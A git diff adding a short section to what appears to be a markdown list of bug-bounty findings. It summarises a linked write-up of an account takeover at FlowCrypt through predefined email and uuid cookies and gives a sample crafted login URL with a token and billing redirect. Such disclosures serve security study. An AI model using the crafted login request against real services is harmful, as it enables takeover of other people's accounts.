@@ -248,12 +248,32 @@ Basically in response we change the id to that user
 
 ---
 
+## Account Takeover because of predefined cookie
 
+https://medium.com/@sushiwushi2/abusing-predefined-cookies-to-account-takeover-in-flowcrypt-f96edb24fa4
 
+<br>
+![a](https://miro.medium.com/max/875/1*wdZv-TSAx-IIvWpgUGtbbg.png)
+<br>
 
+you can see here two cookie set after authentication email and uuid .  
 
+It has billing process which does not use google sign in like login page . It check via email 
 
+but when you fill email and click ok 
+<br>
+![a](https://miro.medium.com/max/875/1*Jc2FFpnq5vgH0FKjCJrjBg.png)
 
+<br>
 
+```
+https://flowcrypt.com/api/account/login?
+account=<EMAIL_ADDRESS>&
+uuid=<UUID_VALUE>&
+token=login-token-raw-Xu29UOpkJ2jqSKbRi2zJia4V4XeXSU8k8A0CgGfi&
+redirect=billing%3Fverify%3Da9e0cd92
+```
 
+It login to the victim account 
 
+---
